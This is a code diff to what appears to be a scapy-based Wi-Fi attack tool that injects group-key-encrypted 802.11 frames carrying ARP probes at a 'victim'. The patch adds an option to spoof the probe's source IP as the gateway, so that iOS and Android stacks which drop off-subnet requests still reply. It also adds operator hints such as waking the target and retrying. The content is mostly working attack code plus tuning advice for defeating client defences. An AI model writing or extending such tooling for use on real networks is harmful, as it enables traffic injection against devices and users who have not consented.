@@ -116,6 +116,17 @@ def parse_args() -> argparse.Namespace:
                         "from the reply's hwsrc; pass --target-mac to skip "
                         "that step. The asserted MAC is also cross-checked "
                         "against the reply when one arrives.")
+    g.add_argument("--probe-src-ip",
+                   help="Override the requestor IP in the verify probe. "
+                        "Default is a random RFC 3927 link-local address "
+                        "(169.254.x.x) so the request leaves no operationally "
+                        "meaningful trace on the target. Stricter stacks "
+                        "(iOS, recent Android, locked-down embedded devices) "
+                        "may silently drop ARP requests with off-subnet psrc "
+                        "and not reply. Pass an IP in the target's subnet "
+                        "(e.g. the gateway) to elicit a reply from those "
+                        "stacks. Cost: a transient (probe-src-ip, our-mac) "
+                        "entry on the target.")
     g.add_argument("--pn-offset", type=lambda v: int(v, 0), default=4,
                    help="How many PNs above the AP's last sniffed broadcast "
                         "PN to send the probe at. Default 4. Bump if "
@@ -259,6 +270,12 @@ def do_verify(args, *, mon_iface: str, atexit_state: dict) -> int:
     if asserted_mac and not _MAC_RE.match(asserted_mac):
         fatal(f"--target-mac {args.target_mac!r} is not a valid MAC.")
 
+    if args.probe_src_ip:
+        try:
+            ipaddress.ip_address(args.probe_src_ip)
+        except ValueError:
+            fatal(f"--probe-src-ip {args.probe_src_ip!r} is not a valid IP.")
+
     from scapy.all import sendp
     from scapy.layers.l2 import ARP
 
@@ -314,13 +331,18 @@ def do_verify(args, *, mon_iface: str, atexit_state: dict) -> int:
             watcher = ArpReplyWatcher(args.iface, our_mac)
             watcher.start()
             try:
-                # Benign requestor IP (RFC 3927 link-local). If the target
-                # records (benign_ip, our_mac) on receipt of the ARP request,
-                # that entry doesn't shadow any real host on the network.
-                benign_ip = (f"169.254.{random.randint(1, 254)}."
-                             f"{random.randint(1, 254)}")
+                # Default requestor IP is RFC 3927 link-local: a transient
+                # (probe_src, our_mac) entry the target may briefly cache
+                # doesn't shadow any real host on the network.
+                # --probe-src-ip overrides this for stricter stacks (iOS,
+                # recent Android) that drop ARP requests with off-subnet psrc.
+                if args.probe_src_ip:
+                    probe_src = args.probe_src_ip
+                else:
+                    probe_src = (f"169.254.{random.randint(1, 254)}."
+                                 f"{random.randint(1, 254)}")
                 probe = ARP(op=1,
-                            hwsrc=our_mac, psrc=benign_ip,
+                            hwsrc=our_mac, psrc=probe_src,
                             hwdst="00:00:00:00:00:00",
                             pdst=args.target_ip)
                 plain = build_dot11_arp_plain(ap_mac=keys.bssid,
@@ -330,7 +352,7 @@ def do_verify(args, *, mon_iface: str, atexit_state: dict) -> int:
                                                pn=probe_pn,
                                                gtk_idx=keys.gtk_idx)
 
-                print(f"[+] Probing {args.target_ip} from {benign_ip}...")
+                print(f"[+] Probing {args.target_ip} from {probe_src}...")
                 sendp(frame, iface=mon_iface, verbose=False)
 
                 reply = watcher.wait_for_reply(args.target_ip, timeout=2.5)
@@ -347,10 +369,18 @@ def do_verify(args, *, mon_iface: str, atexit_state: dict) -> int:
                               "primitive itself may well have worked; the "
                               "victim's reply just isn't reaching us. Likely "
                               "causes, most-likely first:")
+                        print("            - target is asleep / in Wi-Fi "
+                              "power-save (iPhones, Android with screen "
+                              "off). Wake the target and retry.")
+                        if not args.probe_src_ip:
+                            print("            - target's stack drops ARP "
+                                  "requests with off-subnet psrc (iOS, "
+                                  "recent Android). Retry with "
+                                  "--probe-src-ip <gateway-ip>.")
                         print("            - bridged reply path is dropping "
-                              "the victim's unicast ARP reply to us "
-                              "(host firewall on the AP's bridge, "
-                              "broken testbed, AP not bridging STA-to-STA);")
+                              "the victim's unicast ARP reply (host "
+                              "firewall on the AP's bridge, broken testbed, "
+                              "AP not bridging STA-to-STA);")
                         print("            - GTK is randomized per client; "
                               "receiver MIC fails. Run --check-gtk-shared "
                               "to confirm.")
@@ -365,6 +395,14 @@ def do_verify(args, *, mon_iface: str, atexit_state: dict) -> int:
                         print("            - GTK is randomized per client; "
                               "receiver MIC fails. Run --check-gtk-shared "
                               "to confirm.")
+                        print("            - target is asleep / in Wi-Fi "
+                              "power-save (iPhones, Android with screen "
+                              "off). Wake the target and retry.")
+                        if not args.probe_src_ip:
+                            print("            - target's stack drops ARP "
+                                  "requests with off-subnet psrc (iOS, "
+                                  "recent Android). Retry with "
+                                  "--probe-src-ip <gateway-ip>.")
                         print("            - probe PN below the AP's current "
                               "broadcast PN (try a higher --pn-offset);")
                         print("            - monitor iface on the wrong "
